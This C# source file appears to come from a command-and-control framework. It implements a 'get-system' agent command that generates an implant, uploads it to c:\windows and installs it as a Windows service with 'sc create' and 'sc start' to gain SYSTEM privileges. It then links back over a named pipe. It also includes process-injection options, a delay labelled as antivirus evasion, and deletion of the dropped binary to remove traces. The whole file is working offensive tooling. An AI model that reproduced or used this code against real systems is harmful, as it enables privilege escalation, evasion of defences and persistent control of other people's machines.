using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Common.AgentCommands;
using Common.AgentCommands.Composite;
using Common.AgentCommands.Custom;
using Common.CommandLine.Core;
using Common.Payload;
using Shared;

namespace Common.Command.Custom
{
    public class GetSystemCommandOptions : CommandOption
    {
        //[Option("b", "endpoint", "EndPoint to Bind To")]
        //public string endpoint { get; set; }

        [Option("v", "verbose", "Show details of the command execution.")]
        public bool verbose { get; set; }

        [Option("n", "pipe", "Name of the pipe used to pivot.", DefaultValue = "localsys")]
        public string pipe { get; set; }

        [Option("f", "file", "Name of payload.")]
        public string file { get; set; }

        [Option("p", "path", "Name of the folder to upload the payload.", DefaultValue = "c:\\windows")]
        public string path { get; set; }

        [Option("s", "service", "Name of service.", DefaultValue = "syssvc")]
        public string service { get; set; }

        [Option("-x86", "--x86", "Generate a x86 architecture executable")]
        public bool x86 { get; set; }

        //Injection options
        [Option("i", "inject", "If the payload should be an injector")]
        public bool inject { get; set; }

        [Option("id", "injectDelay", "Delay before injection (AV evasion)", DefaultValue = 30)]
        public int injectDelay { get; set; }

        [Option("ipid", "injectProcessId", "Process Id used for injection", DefaultValue = null)]
        public int? injectProcessId { get; set; }

        [Option("ipn", "injectProcessName", "Process Name used for injection")]
        public string injectProcessName { get; set; }

        [Option("ips", "injectProcessSpawn", "Process Image path used for injection (spawn)")]
        public string injectSpawn { get; set; }

        [Option("d", "debug", "generate implant in debug mode")]
        public bool debug { get; set; }
    }

    [Command("get-system", "Obtain system agent using Services", Category = AgentCommandCategories.Composite)]
    public class GetSystemCommand : AgentCompositeCommand<GetSystemCommandOptions>
    {

        protected override async Task<bool> Run(AgentCommandContext context, GetSystemCommandOptions options)
        {
            if (context.Metadata.Integrity != Shared.IntegrityLevel.High)
            {
                context.WriteError($"[X] Agent should be in High integrity context!");
                return false;
            }

            var endpoint = ConnexionUrl.FromString($"pipe://*:{options.pipe}");

            var payloadOptions = new ImplantConfig()
            {
                StoreImplant = false,
                Architecture =  context.Metadata.Architecture == "x86" ? ImplantArchitecture.x86 : ImplantArchitecture.x64,
                Endpoint = endpoint,
                IsDebug = options.debug,
                IsVerbose = options.verbose,
                Type = ImplantType.Service,
            };

            if (options.inject)
            {
                payloadOptions.IsInjected = true;
                payloadOptions.InjectionDelay = options.injectDelay;
                payloadOptions.InjectionProcessId = options.injectProcessId;
                payloadOptions.InjectionProcessName = options.injectProcessName;
                payloadOptions.InjectionProcessSpawn = options.injectSpawn;
            }

            context.WriteInfo($"[>] Generating Implant!");
            var implant = await context.GeneratePayload(payloadOptions);
            if (implant == null)
                context.WriteError($"[X] Generation Failed!");
            else
                context.WriteSuccess($"[+] Generation succeed ({implant.Config.ImplantName})!");

            context.WriteInfo($"[>] Preparing Agent command flow...");

            var fileName = string.IsNullOrEmpty(options.file) ? implant.Config.ImplantName + ".exe" : options.file;
            if (Path.GetExtension(fileName).ToLower() != ".exe")
                fileName += ".exe";

            string path = options.path + (options.path.EndsWith('\\') ? String.Empty : '\\') + fileName;
            context.Echo($"[>] Saving implant to {path}");
            context.Upload(Convert.FromBase64String(implant.Data), path);
            context.Delay(1);

            context.Echo($"[>] Creating service");
            context.Shell($"sc create {options.service} binPath= \"{path}\"");
            context.Echo($"[>] Starting service");
            context.Shell($"sc start {options.service}");

            context.Delay(20);

            if (!options.inject)
            {
                context.Echo($"[>] Removing service");
                context.Shell($"sc delete {options.service}");
                context.Echo($"[!] Don't forget to remove service binary after use! : del {path}");
            }
            else
            {
                context.Echo($"[>]Waiting {options.injectDelay}s to evade antivirus");
                context.Delay(options.injectDelay + 10);
                context.Echo($"[>] Removing service");
                context.Shell($"sc delete {options.service}");
                context.Echo($"[>] Removing injector {path}");
                context.DeleteFile(path);
            }

            context.Echo($"[>] Linking to pipe://127.0.0.1:{options.pipe}");
            var targetEndPoint = ConnexionUrl.FromString($"pipe://127.0.0.1:{options.pipe}");
            context.Link(targetEndPoint);

            context.Echo($"[*] Execution done!");
            context.Echo(Environment.NewLine);

            return true;
        }
    }
}
